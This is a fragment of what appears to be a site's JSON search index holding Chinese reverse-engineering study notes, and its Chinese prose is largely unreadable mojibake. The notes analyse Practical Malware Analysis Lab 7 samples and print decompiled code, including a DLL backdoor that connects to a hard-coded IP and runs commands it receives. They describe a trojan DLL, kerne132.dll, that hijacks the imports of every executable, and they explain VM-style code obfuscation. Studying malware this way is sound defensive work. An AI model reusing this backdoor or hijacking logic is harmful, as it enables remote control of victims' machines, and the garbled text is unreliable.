ä¹‹åæ¸…ç©ºç³»ç»Ÿæ—¶é—´ç»“æ„ä½“ä¸­æœˆçš„æˆå‘˜ï¼Œå¹¶è®¾ç½®å¹´ä¸º2100å¹´ï¼Œä¹‹åè®¾ç½®äº†ä¸€ä¸ªTimeræ¥ç­‰å¾…è¿™ä¸ªæ—¶é—´ï¼š\nmemset(\u0026SystemTime.wMonth, 0, 14); SystemTime.wYear = 2100; SystemTimeToFileTime(\u0026SystemTime, \u0026FileTime); WaitableTimerA = CreateWaitableTimerA(0, 0, 0); SetWaitableTimer(WaitableTimerA, \u0026FileTime, 0, 0, 0, 0); å¦‚æœæ—¶é—´æ²¡åˆ°ï¼Œåˆ™ç¡è§‰ï¼ˆæ—¶é—´å¾ˆé•¿,å¦‚æœè¿™ä¸ªç¡è§‰æ—¶é—´ç»“æŸï¼Œä½†æ˜¯ç­‰å¾…çš„æ—¶é—´è¿˜æ²¡æœ‰åˆ°ï¼Œç¨‹åºä¼¼ä¹å°±ç›´æ¥é€€å‡ºäº†ï¼Œå› ä¸ºè¿™ä¸ª0xFFFFFFFFæ‰2.05å¤©ï¼‰ï¼Œå¦‚æœæ—¶é—´åˆ°äº†åˆ™åˆ›å»º20ä¸ªçº¿ç¨‹ï¼Œè¿™20ä¸ªçº¿ç¨‹ä¸€ç›´å¾ªç¯è®¿é—®ç½‘ç«™http://www.malwareanalysisbook.comï¼š\nif ( !WaitForSingleObject(WaitableTimerA, 0xFFFFFFFF) ) { v2 = 20; do { CreateThread(0, 0, StartAddress, 0, 0, 0); --v2; } while ( v2 ); } Sleep(0xFFFFFFFF); void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter) { void *i; // esi for ( i = InternetOpenA(szAgent, 1u, 0, 0, 0); ; InternetOpenUrlA(i, szUrl, 0, 0, 0x80000000, 0) ) ; } Lab 7-2 æ‰€æœ‰ä»£ç å¦‚ä¸‹ï¼Œæ˜¾è€Œæ˜“è§æ²¡æœ‰æŒä¹…åŒ–ï¼Œä¸é€€å‡ºç­‰æ“ä½œï¼š\nint __cdecl main(int argc, const char **argv, const char **envp) { OLECHAR *v3; // esi LPVOID ppv; // [esp+0h] [ebp-24h] BYREF VARIANTARG pvarg; // [esp+4h] [ebp-20h] BYREF __int16 v7[4]; // [esp+14h] [ebp-10h] BYREF int v8; // [esp+1Ch] [ebp-8h] if ( OleInitialize(0) \u003e= 0 ) { CoCreateInstance(\u0026rclsid, 0, 4u, \u0026riid, \u0026ppv); if ( ppv ) { VariantInit(\u0026pvarg); v7[0] = 3; v8 = 1; v3 = SysAllocString(psz); (*(*ppv + 0x2C))(ppv, v3, v7, \u0026pvarg, \u0026pvarg, \u0026pvarg); SysFreeString(v3); } OleUninitialize(); } return 0; } è¿™ä¸ªCOMç»„ä»¶æœ‰ä¸€ä¸ªè§„å®šå°±æ˜¯ï¼Œå¦‚æœç¨‹åºæƒ³è¦ä½¿ç”¨COMç»„ä»¶é‚£ä¹ˆåœ¨ç¨‹åºå¼€å¤´å¿…é¡»è°ƒç”¨ä¸€ä¸ªæˆ–ä»¥ä¸Šçš„OleInitializeæˆ–è€…CoInitializeExè®©COMåˆå§‹åŒ–ï¼Œè€ŒCoCreateInstanceä¸ºåˆ›å»ºä¸€ä¸ªCOMç»„ä»¶ï¼Œå…¶ä¸­rclsidä¸ºInternet Explorerï¼Œriidä¸ºIWebBrowser2ã€‚æˆ–è®¸æ˜¯æ— æ³•è¯†åˆ«çš„åŸå› ï¼Œè¿™ä¸ª*ppv + 0x2Cï¼Œä¹Ÿå°±æ˜¯[edx+2Ch]è¿™ä¸ªåœ°å€å…¶å®æ˜¯Navigateå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°±å¯ä»¥ä½¿ç¨‹åºå¯åŠ¨Internet Explorerï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼ˆv3ï¼‰å°±æ˜¯å¼¹å‡ºæµè§ˆå™¨çš„åœ°å€ï¼ˆhttp://www.malwareanalysisbook.com/ad.htmlï¼‰ã€‚\nLab 7-3 DLLï¼š\nBOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { SOCKET v3; // esi HANDLE hObject; // [esp+10h] [ebp-11F8h] struct sockaddr name; // [esp+14h] [ebp-11F4h] BYREF struct _PROCESS_INFORMATION ProcessInformation; // [esp+24h] [ebp-11E4h] BYREF struct _STARTUPINFOA StartupInfo; // [esp+34h] [ebp-11D4h] BYREF struct WSAData WSAData; // [esp+78h] [ebp-1190h] BYREF char buf[4093]; // [esp+208h] [ebp-1000h] BYREF __int16 v11; // [esp+1205h] [ebp-3h] char v12; // [esp+1207h] [ebp-1h] if ( fdwReason == 1 ) { buf[0] = byte_10026054; memset(\u0026buf[1], 0, 0xFFCu);\t//åˆå§‹åŒ– v11 = 0; v12 = 0; if ( !OpenMutexA(0x1F0001u, 0, Name) )\t//æ‰“å¼€äº’æ–¥ä½“ï¼Œå¦‚æœæ²¡æœ‰å°±åˆ›å»ºä¸€ä¸ª { CreateMutexA(0, 0, Name); if ( !WSAStartup(0x202u, \u0026WSAData) )\t//åˆå§‹åŒ–winsockåº“ { v3 = socket(2, 1, 6);\t//åˆ›å»ºtcpé€šä¿¡ if ( v3 != -1 ) { name.sa_family = 2; *\u0026name.sa_data[2] = inet_addr(cp); *name.sa_data = htons(0x50u); if ( connect(v3, \u0026name, 16) != -1 ) { while ( 1 ) { while ( 1 ) { do { if ( send(v3, ::buf, strlen(::buf), 0) == -1 || shutdown(v3, 1) == -1 )\t//è¿™ä¸ªsendå‘é€äº†hello goto LABEL_15; } while ( recv(v3, buf, 4096, 0) \u003c= 0 );\t//å¦‚æœæ¥æ”¶åˆ°sleepå°±ç¡è§‰60ç§’ï¼Œå¦‚æœæ¥æ”¶åˆ°execå°±æ¥æ”¶ç¬¬äº”ä¸ªä¹‹åçš„å€¼è¿›è¡Œå¯åŠ¨è¿›ç¨‹ã€‚ if ( strncmp(expect_sleep, buf, 5u) ) break; LABEL_10: Sleep(0x60000u); } if ( strncmp(expect_exec, buf, 4u) ) { if ( buf[0] == 'q' ) { CloseHandle(hObject); break; } goto LABEL_10; } memset(\u0026StartupInfo, 0, sizeof(StartupInfo)); StartupInfo.cb = 68; CreateProcessA(0, \u0026buf[5], 0, 0, 1, 0x8000000u, 0, 0, \u0026StartupInfo, \u0026ProcessInformation); } } LABEL_15: closesocket(v3); } WSACleanup(); } } } return 1; } EXEï¼š\nå¤§è‡´æµç¨‹ä¸º\nç¨‹åºåœ¨system32ç›®å½•ä¸‹åˆ›å»ºkerne132.dllæ–‡ä»¶ åˆ›å»ºLab07-03.dllæ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œé€šè¿‡ä¸€ç³»åˆ—æ“ä½œï¼Œå°†Lab07-03.dllæ–‡ä»¶å†™å…¥ç‰¹å®šå†…å®¹ï¼Œå¯ä»¥ä½¿kerne132.dllçš„å¯¼å‡ºè¡¨ä¸kernel32.dllçš„å¯¼å‡ºè¡¨ç›¸åŒï¼Œå¹¶ä¸”å½“è°ƒç”¨kerne132.dllä¸­çš„apiæ—¶è½¬å‘åˆ°kernel32.dllä¸­è°ƒç”¨å‡½æ•° å°†Lab07-03.dllå¤åˆ¶åˆ°system32ç›®å½•ä¸‹çš„kerne132.dllæ–‡ä»¶ä¸­ éå†Cç›®å½•ä¸‹çš„æ‰€æœ‰.exeæ–‡ä»¶ï¼Œå°†å…¶ä¸­çš„kernel32.dllæ”¹ä¸ºkerne132.dll "},"title":"Lab"},"/docs/remaining/obfu/":{"data":{"":"","#":"VM ä»£ç å—ä¸å˜å¼‚ ä»£ç å—å®šä¹‰ï¼šç”±ç¨‹åºæ‰§è¡Œæµç¨‹ä¸­å‘ç”Ÿè·³è½¬çš„æŒ‡ä»¤ä½œä¸ºåˆ†éš”çº¿åˆ’åˆ†å‡ºæ¥çš„ä»£ç å†…å®¹ï¼Œä»£ç å—ä¸ç­‰äºå‡½æ•°å—ï¼Œå› ä¸ºå‡½æ•°å—å…·æœ‰ä¸€å®šçš„æ ¼å¼ã€‚ï¼ˆvmä¸­åˆ†éš”ä»£ç å—çš„åˆ†éš”çº¿æ˜¯å˜å¼‚ï¼‰\nå¾ªç¯ä»£ç å—ï¼ˆvmæŒ‡ä»¤ï¼‰ï¼šæ˜¯è™šæ‹Ÿæœºåˆ†é…ä»»åŠ¡çš„ä¸€ç§å¤„ç†ç¨‹åºã€‚\nä»£ç å˜å¼‚ï¼šæ”¹å˜ä»£ç çš„æ‰§è¡Œé¡ºåºä½†æ˜¯é€»è¾‘æ˜¯ä¸å˜çš„ï¼Œå°±æ˜¯æ”¹å˜äº†ä½ç½®\njmp xxxå±æ€§ï¼šä¸å½±å“æ ‡å¿—ä½ã€é‡å®šä½ã€æ ˆ\nç®€å•çš„ä»£ç é€šè¿‡åŠ jmpçš„æ–¹å¼ä½¿æµç¨‹å˜å¤æ‚äº†ï¼š\ngraph TB A[L1:\\nmov eax,eax\\nadd eax,ecx\\njmp L2] B[L3:\\npop esp\\nretf] C[push ebp\\npush ecx\\njmp L1] D[L2:\\nadd ecx,eax\\npop ebp\\njmp L3] A ~~~ B ~~~ C ~~~ D A --\u003e D C --\u003e A D --\u003e B å¤„ç†æŒ‡ä»¤å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š\ngraph TB A[vcpuå¾ªç¯ç»“æ„ï¼ˆä»£ç æ‰§è¡Œï¼‰] B[è¯»å–væŒ‡ä»¤] C[vADD] A --\u003e B B --\u003e A A --\u003e C C --\u003e A å‡½æ•°è°ƒç”¨æµç¨‹ é€€å‡ºè™šæ‹Ÿæœºå¯„å­˜å™¨ä¿æŒä¸€è‡´ï¼Œæ¢å¤åˆ°åŸx86CPUæˆ–x64CPUã€‚eflagä¹Ÿæ˜¯ã€‚ ç‰¹ç‚¹ï¼š è™šæ‹ŸåŒ–ä¸€ä¸ªå‡½æ•°ï¼Œè°ƒç”¨å‡½æ•°è‚¯å®šä¼šé€€å‡ºè™šæ‹Ÿæœºï¼ˆæˆ–è€…æŠŠè°ƒç”¨çš„APIä¹Ÿç»™VMäº†ï¼‰ è™šæ‹Ÿæœºæ‰§è¡Œåˆ°ä¸€ä¸ªå‡½æ•°æ—¶ï¼ŒæŒ‡ä»¤ä¹Ÿéšä¹‹ç»“æŸ å‡½æ•°è°ƒç”¨ä¸é€€å‡ºçš„æ—¶å€™ä¼šé‡æ–°è¿›å…¥è™šæ‹Ÿæœº é‡åˆ°æ— æ³•æ¨¡æ‹Ÿçš„æŒ‡ä»¤åˆ™ä¼šé€€å‡ºè™šæ‹Ÿæœºï¼Œæ‰§è¡Œå®Œæ— æ³•æ¨¡æ‹Ÿçš„æŒ‡ä»¤åé‡æ–°è¿›å…¥è™šæ‹Ÿæœº æµç¨‹ç»“æ„ è™šæ‹Ÿæœºæµç¨‹ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š\nå‚æ•°è½¬ç§» åº”è¯¥æ˜¯VMä¸¤ä¸ªä¸åŒçš„å‡½æ•°åå¦‚æœå‚æ•°ï¼ˆç»†èŠ‚ï¼‰ç›¸åŒï¼Œé‚£ä¹ˆå°±ä¼šå°†è¿™ä¸¤ä¸ªå‡½æ•°å˜æˆä¸€ä¸ªå‡½æ•°è¿›è¡Œæ— ç¼æ‰§è¡Œã€‚\næµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š\nå½“ç¨‹åºæ— ç¼æ‰§è¡Œåï¼ˆæ¯”å¦‚ä¸Šå›¾ï¼‰æ˜¯æ— æ³•æ•æ‰åˆ°vfunc2çš„ç‰¹å¾çš„ï¼Œåªèƒ½æ•æ‰çš„å°±æ˜¯vfunctotalæ‰§è¡Œåçš„è¿”å›å€¼ç­‰å±æ€§ã€‚\nä¹‹å‰è¯´è¿‡è™šæ‹ŸåŒ–ä¸€ä¸ªå‡½æ•°ï¼Œè°ƒç”¨å‡½æ•°è‚¯å®šä¼šé€€å‡ºè™šæ‹Ÿæœºï¼Œä½†æ˜¯æ— ç¼æ‰§è¡Œä¸­çš„å‡½æ•°è°ƒç”¨ä¸ä¼šé€€å‡ºè™šæ‹Ÿæœºã€‚\nåˆæµ ä»£ç æ¼‚ç§» æ ˆæœº æ ˆæœºæŒ‡çš„æ˜¯ä¸€ç§è®¡ç®—æœºä½“ç³»ç»“æ„ï¼Œåœ¨è¿™ç§ä½“ç³»ç»“æ„ä¸­ï¼Œå¤§éƒ¨åˆ†æ“ä½œéƒ½ä¾èµ–äºä¸€ä¸ªæ“ä½œæ•°æ ˆæ¥å®Œæˆã€‚\nä¸åŒè§£é‡Šï¼š\næ­£å¸¸æˆ‘ä»¬é‡åˆ°çš„å¤§å¤šæ•°æ˜¯å¯„å­˜å™¨æœºï¼Œç”¨å¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼Œæ¯”å¦‚ä¸¤ä¸ªæ•°å­—ç›¸åŠ ï¼š\nmov eax, 0x1145 mov ebx, 0x14 ;ä¹‹åå–å€¼å°±ç›´æ¥ä½¿ç”¨å¯„å­˜å™¨å–å€¼äº† add eax, ebx æ ˆæœºåˆ™æ˜¯é€šè¿‡æ ˆä¼ å‚æ•°ï¼ˆä¸pwnçš„ROPä¼ å‚æœ‰ç‚¹ç±»ä¼¼ï¼‰\npush 0x1145 push 0x14 ;å–å€¼å¯ä»¥é€šè¿‡espåŠ åç§»å–å€¼ï¼Œæ“ä½œæ€§æ›´å¼º mov eax,[esp+4] add eax,[esp] pop ebx ;å¹³æ ˆ pop ebx å †æœº å †çš„ç‰¹ç‚¹ï¼š\nåœ°å€ä¸å›ºå®šï¼ˆå¯èƒ½éœ€è¦å¤„ç†é‡å®šä½ï¼‰ éœ€è¦åŠ¨æ€åˆ†é…ï¼ˆallocï¼‰ å®ç°å¦‚ä¸‹ï¼š\ngraph TB A[è¿›å…¥è™šæ‹Ÿæœº] B[è¿›å…¥æ ˆæ¨¡å¼æ¶æ„çš„è™šæ‹Ÿæœºï¼ˆæ ˆæœºï¼‰] C[æ ˆæ¨¡å¼æ¶æ„åˆ†é…ä¸€å®šç©ºé—´ï¼ˆGetModuleHandleï¼ˆï¼‰ï¼‰] D[ç»è¿‡é‡å®šä½å¤„ç†çš„shellcodeå†™å…¥å †] E[vEIPè½¬ç§»] A --\u003e B B --\u003e C C --\u003e D D --\u003e E å¯ä»¥åŠ¨æ€ä¿®å¤åœ°å€ï¼š\ncall Lab1 Lab1ï¼š pop eax ;eaxä¸ºcallçš„ä¸‹ä¸€è¡Œçš„åœ°å€ï¼Œå¯ä»¥ç®—å‡ºé‡å®šä½åœ°å€ opcode å‚è€ƒä»£ç å¦‚ä¸‹ï¼Œå®ç°å¼¹ä¸¤ä¸ªä¿¡æ¯æ¡†ï¼š\n.386 option casemap:none .model flat,stdcall include user32.inc includelib user32.lib .data g_MessageBoxMy db 00,00,00,00,00,\\ 00,00,00,00,00,\\ 00,00,00,00,00,\\ 00,00,00,00,00, 00 g_offsetMessage dd 00 db 01 .data g_handletable dd offset vPush,offset vCall g_dispatchFun dd ? .code vPush proc mov eax,dword ptr [esi] push eax add esi,4 jmp g_dispatchFun vPush endp vCall proc mov eax,dword ptr [esp] add esp,4 push offset vEntry jmp eax jmp g_dispatchFun vCall endp vEntry proc ret vEntry endp Main proc uses esi mov g_offsetMessage,OFFSET MessageBoxA mov g_dispatchFun,LOOP_OPCODE mov esi,offset g_MessageBoxMy LOOP_OPCODE: movzx edx,byte ptr [esi] inc esi jmp dword ptr [g_handletable + edx * 4] ret Main endp end Main å¤§æ¦‚é€»è¾‘å¦‚ä¸‹ï¼š\né¦–å…ˆè·å–opcodeçš„ç¬¬ä¸€ä½ï¼Œåˆ¤æ–­æ˜¯ä»€ä¹ˆè™šæ‹ŸæŒ‡ä»¤ å¦‚æœæ˜¯00ï¼Œåˆ™ä¸ºvPushï¼Œåˆ™è¿›å…¥vPushè¿›è¡Œå¤„ç† åœ¨vPushé‡Œé¢ä¼šå°†4å­—èŠ‚å‹å…¥æ ˆä¸­ï¼Œç„¶åå°†opcodeåŠ 4ã€‚å¦‚æ­¤å¾ªç¯ç›´åˆ°å‹å…¥g_offsetMessageå°±æ˜¯MessageBoxAçš„åœ°å€ã€‚ ä¹‹åå–å‡º01ï¼Œä¸ºvCallï¼ˆedx=1ï¼Œè·³è½¬åˆ°g_handletableçš„ç¬¬äºŒä¸ªï¼‰ï¼Œè¿›å…¥vCallè¿›è¡Œå¤„ç† åœ¨vCallé‡Œé¢ä¼šå–å‡ºespä½ç½®çš„å€¼ï¼Œå°†æ ˆé™ä½4å­—èŠ‚ï¼ˆç›¸å½“äºPush eaxï¼‰ï¼Œä¹‹åå‹å…¥è¿”å›åœ°å€vEntryï¼Œå°±è·³åˆ°eaxæ‰§è¡ŒMessageBoxAã€‚ ä»£ç å˜å½¢ ä¸€æ¡æŒ‡ä»¤å¯èƒ½ç”±å¤šæ¡æŒ‡ä»¤ç»„åˆï¼Œæ¯æ¬¡ç¼–è¯‘éƒ½ä¸åŒ å¯ä»¥å®ç°ä¸€å †ç­‰ä»·çš„æ±‡ç¼–ä»£ç æ„æˆä¸€ä¸ªåº“ï¼Œç„¶åé€šè¿‡éšæœºæ•°å»æ›¿æ¢åŸç†çš„æ±‡ç¼–ä»£ç ï¼Œè¾¾åˆ°å˜å½¢ è†¨èƒ€ å°†ä¸€è¡Œæ±‡ç¼–æŒ‡ä»¤ç­‰ä»·çš„å˜ï¼ˆæ›¿æ¢ï¼‰ä¸ºå¤šè¡Œæ±‡ç¼–æŒ‡ä»¤ï¼Œå¢å¤§ä»£ç é‡\nè‡ªè†¨èƒ€éœ€è¦ä¸€å®šçš„åª’ä»‹ï¼ˆæ¯”å¦‚æ ˆï¼‰\nmov eax, ecx è†¨èƒ€0ï¼š push ecx pop eax è†¨èƒ€1ï¼š sub esp, 4 mov [esp], ecx mov eax, [esp] add esp, 4 è†¨èƒ€2ï¼š mov ebx, 2 shl ebx, 1 sub esp, ebx lea edi, [esp] mov edx, ecx mov [edi], edx lea edi, [esp] mov edx, [edi] mov eax, edx mov ebx, 8 shr ebx, 1 add esp, ebx ä¿è¯ï¼š\nä¿è¯å¯„å­˜å™¨ã€æ ‡å¿—ä½ã€æ ˆä¸è¢«å½±å“ ä¿è¯å¼‚å¸¸çš„é¡ºåºæ­£å¸¸ è‡ªè†¨èƒ€è¿‡ç¨‹ä¸­ä¼˜å…ˆä½¿ç”¨å¯„å­˜å™¨è†¨èƒ€ï¼ˆå› ä¸ºå¯„å­˜å™¨çš„æ•ˆç‡å¤§äºæ ˆï¼‰ åˆ†å‘ vmp2.xçš„æµç¨‹åˆ†å‘ä¸ºvm_dispatch\nvmp3.xçš„æµç¨‹æ–¹æ³•ä¸ºvm_handleï¼Œä¹Ÿå°±æ˜¯åªæœ‰æ‰§è¡Œäº†ä¸Šä¸€ä¸ªhandleæ‰ä¼šç¡®å®šå¹¶æ‰§è¡Œä¸‹ä¸€ä¸ªhandle\nä¸‡ç”¨é—¨ vmp2.xï¼šnor\nvmp3.xï¼šnorï¼ˆæˆ–éé—¨ï¼‰ï¼Œnandï¼ˆä¸éé—¨ï¼‰\nä¸éé—¨ï¼š\n//æ ¹æ®å¾·æ‘©æ ¹å¾‹æ¨å¯¼ not(a) = nand(a) and(a,b) = nand(nand(a,b),nand(a,b)) or(a,b) = nand(nand(a,a),nand(b,b)) xor(a,b) = nand(nand(nand(a,a),b),nand(a,nand(b,b))) nand(1,0) = !(1 \u0026 0) = 1 nand(1,1) = !(1 \u0026 1) = 0 æˆ–éé—¨ï¼š\n//æ ¹æ®å¾·æ‘©æ ¹å¾‹æ¨å¯¼ not(a) = nor(a) and(a,b) = nor(nor(a,a),nor(b,b)) or(a,b) = nor(nor(a,b),nor(a,b)) xor(a,b) = nor(nor(nor(a,a),nor(b,b)),nor(a,b)) "},"title":"Obfu"},"/docs/remaining/program-analysis/":{"data":{"":"","#":"ä»‹ç» åŸåˆ™ï¼š æŸ¥æ‰¾ç¨‹åºçš„é”™è¯¯å®å¯è¯¯æŠ¥ï¼Œä¸å¯æ¼æŠ¥ã€‚åœ¨ç¡®ä¿æ­£ç¡®çš„å‰æä¸‹ï¼Œå°½å¯èƒ½çš„æé«˜åˆ†æé€Ÿåº¦ä¸ç²¾ç¡®åº¦ã€‚ éå†ç¨‹åºçš„æ‰§è¡Œæµè¦å…¨é¢ï¼Œä¸å…¨é¢å¯èƒ½ä¼šæ¼æŠ¥é”™è¯¯ã€‚ Intermediate Representation ç¼–è¯‘æµç¨‹ï¼š\ngraph TB A[æºä»£ç ] B[Scanner\\nè¯æ³•åˆ†æ] C[Parser\\nè¯­æ³•åˆ†æ] D[Type Checker\\nè¯­ä¹‰åˆ†æ] E[Translator] F[Code Generator] G[æœºå™¨ç ] A --\u003e B B --Tokens--\u003e C C --AST--\u003e D D --Decorated AST--\u003e E E --IR(é™æ€åˆ†æ)--\u003e F F --\u003e G AST IR\nå¯¹äºä¸€ä¸‹çš„ä»£ç ï¼š\ndo i = i + 1; while (a[i] \u003c v); å¯ä»¥é€šè¿‡GCCä½¿ç”¨æŒ‡ä»¤æŸ¥çœ‹GIMPLEï¼š\ngcc -O0 -fdump-tree-all test.cpp GCCä¼šå°†æºä»£ç é¦–å…ˆè½¬æ¢ä¸ºGENERICï¼ˆä¸€ç§æ ‘çŠ¶è¡¨ç¤ºï¼‰ï¼Œç„¶åé™çº§ä¸ºGIMPLEï¼ˆä¸€ç§ç®€åŒ–çš„ã€çº¿æ€§çš„ã€åŸºäºå¯„å­˜å™¨çš„3-åœ°å€å½¢å¼ï¼‰ï¼Œæœ€åå†è½¬æ¢ä¸ºRTLï¼ˆæ›´ä½çº§çš„è¡¨ç¤ºï¼‰ã€‚\nGIMPLEå¦‚ä¸‹ï¼ˆ.gimpleï¼‰ï¼š\n\u003cD.4674\u003e: i = i + 1; _1 = a[i]; if (v \u003e _1) goto \u003cD.4674\u003e; else goto \u003cD.4672\u003e; \u003cD.4672\u003e: ASTå¦‚ä¸‹ï¼š\ngraph TD A[DoWhile] --\u003e B(Body); A --\u003e C(Condition); B --\u003e D[=]; D --\u003e E(Target); D --\u003e F(Value); E --\u003e G[i]; F --\u003e H[+]; H --\u003e I(Left); H --\u003e J(Right); I --\u003e K[i]; J --\u003e L[1]; C --\u003e M[\u003c]; M --\u003e N(Left); M --\u003e O(Right); N --\u003e P[Array]; P --\u003e Q(Base); P --\u003e R(Index); Q --\u003e S[a]; R --\u003e T[i]; O --\u003e U[v]; Static Single Assisnmentï¼ˆSSAï¼‰\nç›¸è¾ƒäº3-åœ°å€ç è€Œè¨€ï¼Œæ¯ä¸€ä¸ªå˜é‡éƒ½æœ‰è‡ªå·±çš„ä¸€ä¸ªå®šä¹‰ã€‚å¦‚æœé‡åˆ°ä¸åŒçš„æ‰§è¡Œæµæ‰€å½±å“çš„å˜é‡åˆ™åœ¨å—å½±å“çš„å˜é‡å‰æ·»åŠ Î¦(x0,x1)ï¼ˆå¦‚ä¸‹x0ä¸x1å½±å“x2ï¼‰ã€‚\ngraph TB A[if e] B[x0 = 0] C[x1 = 1] D[y = x + 7] E[if e] F[x0 = 0] G[x1 = 1] H[Î¦ï¼ˆx0,x1ï¼‰\\ny = x2 + 7] A --\u003e B A --\u003e C C --\u003e D B --\u003e D E --\u003e F E --\u003e G F --\u003e H G --\u003e H Control Flow Analysisï¼ˆCFGï¼‰\næ§åˆ¶æµå›¾ï¼Œå°±æ˜¯åœ¨IDAä¸­çš„æ±‡ç¼–ç•Œé¢æŒ‰ç©ºæ ¼å°±èƒ½çœ‹åˆ°ç±»ä¼¼çš„ã€‚\næ‰§è¡Œæµç¨‹æ€»ä½“æ˜¯è‡ªä¸Šåˆ°ä¸‹çš„ï¼Œé‡åˆ°åˆ¤æ–­ç­‰ä¼šæœ‰ä¸¤ä¸ªä¸¤ä¸ªæ‰§è¡Œæµï¼›é‡åˆ°å¼ºè¡Œè·³è½¬ç­‰åˆ™ä¸ä¼šæœ‰ä¸‹ä¸€è¡Œçš„æ‰§è¡Œæµã€‚\ngraph TB A[Entry] B[x = input\\ny = x - 1] C[z = x * y\\nif z \u003c x goto B4] D[p = x / y\\np = q + y] E[a = q\\nb = x + a\\nc = 2a - b\\nif p == q goto B6] F[goto B2] G[return] H[Exit] A~~~B~~~C~~~D~~~E~~~F~~~G~~~H A --\u003e B B --\u003e C C --\u003e E C --\u003e D D --\u003e E E --\u003e F E --\u003e G F --\u003e B G --\u003e H Basic Blocks\nåº”è¯¥å°±æ˜¯èµ·å§‹çš„ä»£ç å—ï¼Œè¦æ±‚ä¸èƒ½æœ‰å…¶ä»–çš„å…¥å£ï¼Œç»“æŸä¸ºæœ€åä¸€æ¡è¯­å¥\nData Flow Analysis1 è¾“å…¥è¾“å‡ºçŠ¶æ€\nå¯¹äºæŸæ®µä»£ç æˆ–å‡½æ•°ï¼Œç”¨IN[s1]ä»£è¡¨è¾“å…¥çš„ä¿¡æ¯ï¼ˆå‚æ•°ç­‰ï¼‰ï¼›ç”¨OUT[s1]ä»£è¡¨è¾“å‡ºçš„ä¿¡æ¯ï¼ˆè¿”å›å€¼ç­‰ï¼‰\nåœ¨ä¸€æ¡æ‰§è¡Œæµä¸Šç›¸é‚»çš„ä»£ç ï¼Œå‰é¢ä»£ç çš„è¾“å‡ºä¿¡æ¯ç­‰äºåé¢ä»£ç çš„è¾“å…¥ä¿¡æ¯ï¼›ä¸€æ¡æ‰§è¡Œæµåˆ†ä¸ºå¤šæ¡çš„æƒ…å†µä¸‹ï¼Œå¤šæ¡æ‰§è¡Œæµçš„è¾“å…¥ä¿¡æ¯ä¸ºé‚£ä¸€æ¡æ‰§è¡Œæµçš„è¾“å‡ºä¿¡æ¯ï¼›å¤šæ¡æ‰§è¡Œæµåˆä¸ºä¸€æ¡æ‰§è¡Œæµï¼Œè¿™ä¸€æ¡æ‰§è¡Œæµçš„è¾“å…¥ä¿¡æ¯ä¸ºå¤šæ¡æ‰§è¡Œæµçš„è¾“å‡ºä¿¡æ¯ï¼ˆç”¨^è¿æ¥ï¼Œæ„ä¸ºç›¸é‡ï¼‰"},"title":"Program Analysis"},"/docs/remaining/web/":{"data":{"":"","#":"ç½‘ç«™çš„æ­å»º httpåè®®\nè¶…æ–‡æœ¬ä¼ è¾“åè®®æ˜¯äº’è”ç½‘ä¸Šåº”ç”¨æœ€å¹¿æ³›çš„ä¸€ç§ç½‘ç»œåè®®ã€‚æ‰€æœ‰wwwæ–‡ä»¶éƒ½å¿…é¡»éµå¾ªä¸€ä¸ªæ ‡å‡†ï¼Œæ˜¯ä»¥ASCIIç ä¼ è¾“ï¼Œå»ºç«‹åœ¨TCP/IPåè®®ä¹‹ä¸Šçš„åº”ç”¨å±‚è§„èŒƒï¼Œç®€å•ç‚¹è¯´å°±æ˜¯ä¸€ç§å›ºå®šçš„é€šè®¯è§„åˆ™ã€‚\nç½‘ç»œçš„ä¸‰ç§æ¶æ„åŠç‰¹ç‚¹\nå®¢æˆ·æœº/æœåŠ¡å™¨æ¶æ„ï¼ˆC/Sï¼‰\néœ€è¦å®‰è£…ç‰¹å®šçš„å®¢æˆ·ç«¯ç¨‹åºï¼Œé’ˆå¯¹ä¸åŒå¹³å°å¼€å‘ä¸åŒç‰ˆæœ¬ï¼Œå‡çº§åº”ç”¨éœ€è¦æ›´æ–°å®‰è£…ï¼Œèƒ½å¤Ÿç›´æ¥ä½¿ç”¨å®¢æˆ·ç«¯ç¡¬ä»¶èµ„æºã€‚\næµè§ˆå™¨/æœåŠ¡å™¨ï¼ˆB/Sï¼‰\nå®¢æˆ·ç«¯æ— éœ€å®‰è£…ï¼Œæœ‰Webæµè§ˆå™¨å³å¯è·¨å¹³å°ï¼Œæ— ç¼å‡çº§ï¼Œå®¢æˆ·ç«¯å…ç»´æŠ¤\nP2Pç»“æ„\nç‚¹åˆ°ç‚¹ç³»ç»Ÿï¼Œä¸éœ€è¦æœåŠ¡å™¨ä¸­è½¬ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯å½¼æ­¤ç›´æ¥é€šä¿¡ã€‚\nç½‘ç«™æ˜¯å¦‚ä½•æ­å»ºçš„\nåˆ†ä¸ºæœåŠ¡å™¨ï¼Œä¸­é—´ä»¶ï¼Œæ•°æ®åº“ï¼Œä»£ç ï¼ˆåç«¯ï¼‰ï¼Œé™æ€èµ„æºï¼ˆå‰ç«¯ï¼Œå†™åŠŸèƒ½ç‚¹ï¼‰\nç½‘ç«™çš„è¿è¡ŒåŸç† å¸¸ç”¨æœ¯è¯­\nå®¢æˆ·ç«¯ï¼šè¿æ¥åˆ°äº’è”ç½‘çš„åº”ç”¨ç¨‹åºï¼ŒåŠæµè§ˆå™¨ æœåŠ¡å™¨ï¼šèƒ½ä¸Šç½‘çš„è®¡ç®—æœºï¼Œç”¨äºç”¨äºæ¥æ”¶å’Œå¤„ç†ç”¨æˆ·çš„è¯·æ±‚ä¿¡æ¯ IPåœ°å€ï¼šäº’è”ç½‘åè®®åœ°å€ï¼ŒTCP/IPç½‘ç»œè®¾å¤‡çš„æ•°å­—æ ‡è¯†ç¬¦ï¼Œç”¨äºè¯†åˆ«å’Œé€šä¿¡ï¼Œipv4ä¸ipv6 åŸŸåï¼šç”¨äºæ ‡è¯†ä¸€ä¸ªæˆ–å¤šä¸ªipåœ°å€ DNSï¼šåŸŸåç³»ç»Ÿï¼Œç”¨äºè·Ÿè¸ªè®¡ç®—æœºçš„åŸŸååŠå…¶åœ¨äº’è”ç½‘ä¸Šç›¸åº”çš„IPåœ°å€ ISPï¼šäº’è”ç½‘æœåŠ¡æä¾›å•† TCP/IPï¼šä¼ 